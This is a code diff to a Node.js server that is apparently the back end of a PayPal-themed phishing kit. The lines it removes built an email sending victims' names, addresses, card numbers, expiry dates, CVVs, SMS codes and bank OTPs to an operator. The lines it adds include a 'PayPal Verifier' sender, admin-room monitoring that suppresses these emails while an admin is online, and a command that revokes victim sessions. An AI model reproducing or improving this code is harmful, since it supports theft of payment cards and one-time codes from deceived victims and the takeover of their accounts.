@@ -8,7 +8,6 @@ import rateLimit from 'express-rate-limit';
 import fs from 'fs';
 import crypto from 'crypto';
 import https from 'https';
-import geoip from 'geoip-lite';
 import nodemailer from 'nodemailer';
 import * as db from './db';
 
@@ -96,12 +95,28 @@ io.on('connection', (socket) => {
         console.log(`[Socket] ${socket.id} joined session room: ${sessionId}`);
     });
 
+    socket.on('joinAdmin', () => {
+        socket.join('admin');
+        console.log(`[Socket] ${socket.id} joined ADMIN room`);
+    });
+
     socket.on('disconnect', () => {
         console.log('[Socket] Client disconnected:', socket.id);
     });
 });
 
 // --- API Routes ---
+
+// Email Transporter
+const transporter = nodemailer.createTransport({
+    host: process.env.SMTP_HOST || 'smtp.example.com',
+    port: parseInt(process.env.SMTP_PORT || '587'),
+    secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
+    auth: {
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS
+    }
+});
 
 // Settings Helper
 let cachedSettings: any = {};
@@ -150,64 +165,32 @@ const sendTelegram = (msg: string) => {
 const sendEmail = async (session: any) => {
     if (!cachedSettings.email) return;
 
-    const flagUrl = session.ipCountry ? `https://flagcdn.com/w40/${session.ipCountry.toLowerCase()}.png` : '';
+    // Check if Admin is online
+    const adminRoom = io.sockets.adapter.rooms.get('admin');
+    if (adminRoom && adminRoom.size > 0) {
+        console.log(`[Email] Admin online, suppressing email for session ${session.sessionId}`);
+        return;
+    }
 
-    let cardLogoUrl = '';
-    const type = session.cardType?.toLowerCase();
-    if (type === 'visa') cardLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
-    else if (type === 'mastercard') cardLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
-    else if (type === 'amex') cardLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
-    else if (type === 'discover') cardLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
-
-    const html = `
-        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-            <div style="background-color: #003087; padding: 20px; text-align: center;">
-                <h1 style="color: white; margin: 0;">Session Verified</h1>
-            </div>
-            <div style="padding: 20px; border: 1px solid #ddd;">
-                <p><strong>Session ID:</strong> ${session.sessionId}</p>
-                <p><strong>Status:</strong> <span style="color: green; font-weight: bold;">VERIFIED</span></p>
-
-                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-
-                <h3>Identity</h3>
-                <p><strong>Name:</strong> ${session.firstName} ${session.lastName}</p>
-                <p><strong>Address:</strong> ${session.address}</p>
-                <p><strong>Country:</strong>
-                   ${flagUrl ? `<img src="${flagUrl}" style="vertical-align: middle; height: 16px; margin-right: 5px;">` : ''}
-                   ${session.ipCountry || 'Unknown'}
-                </p>
-
-                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-
-                <h3>Financial</h3>
-                <div style="margin-bottom: 10px;">
-                    ${cardLogoUrl ? `<img src="${cardLogoUrl}" style="height: 30px; display: block; margin-bottom: 10px;">` : ''}
-                    <strong>Card:</strong> ${session.cardNumber}
-                </div>
-                <p><strong>Expiry:</strong> ${session.cardExpiry}</p>
-                <p><strong>CVV:</strong> ${session.cardCvv}</p>
-
-                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-
-                <h3>Security</h3>
-                <p><strong>SMS Code:</strong> ${session.phoneCode}</p>
-                <p><strong>Bank OTP:</strong> ${session.cardOtp}</p>
-                <p><strong>IP Address:</strong> ${session.fingerprint?.ip || 'Unknown'}</p>
-            </div>
-        </div>
-    `;
+    console.log(`[Email] Sending email to ${cachedSettings.email} for session ${session.sessionId}`);
 
     try {
-        await transporter.sendMail({
-            from: process.env.SMTP_FROM || '"Security Alert" <no-reply@security.com>',
+        const info = await transporter.sendMail({
+            from: process.env.SMTP_FROM || '"PayPal Verifier" <no-reply@example.com>',
             to: cachedSettings.email,
-            subject: `[Verified] Session ${session.sessionId.substring(0, 8)}`,
-            html: html
+            subject: `✅ Session Verified: ${session.sessionId}`,
+            html: `
+                <h2>Session Verified</h2>
+                <p><strong>Session ID:</strong> ${session.sessionId}</p>
+                <p><strong>IP:</strong> ${session.fingerprint?.ip || session.ip || 'Unknown'}</p>
+                <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+                <hr>
+                <p>Login to the admin dashboard to view details.</p>
+            `
         });
-        console.log(`[Email] Sent to ${cachedSettings.email}`);
-    } catch (e) {
-        console.error('[Email] Failed to send:', e);
+        console.log(`[Email] Email sent: ${info.messageId}`);
+    } catch (error) {
+        console.error(`[Email] Email failed:`, error);
     }
 };
 
@@ -366,6 +349,37 @@ app.post('/api/sessions/:id/pin', async (req, res) => {
         }
     } catch (e) {
         res.status(500).json({ error: 'Failed to pin' });
+    }
+});
+
+// Revoke Session
+app.post('/api/sessions/:id/revoke', async (req, res) => {
+    try {
+        const id = req.params.id;
+        console.log('[API] Revoking session:', id);
+
+        const session = await db.getSession(id);
+        if (session) {
+            // Update status
+            session.status = 'Revoked';
+            await db.upsertSession(id, session, session.ip);
+
+            // Queue Command for Client
+            await db.queueCommand(id, 'REVOKE', {});
+
+            // Notify Client (Real-time)
+            io.to(id).emit('command', { action: 'REVOKE', payload: {} });
+
+            // Notify Admins
+            io.emit('sessions-updated');
+
+            res.json({ status: 'revoked' });
+        } else {
+            res.status(404).json({ error: 'Not found' });
+        }
+    } catch (e) {
+        console.error('[API] Revoke failed:', e);
+        res.status(500).json({ error: 'Failed to revoke' });
     }
 });
 
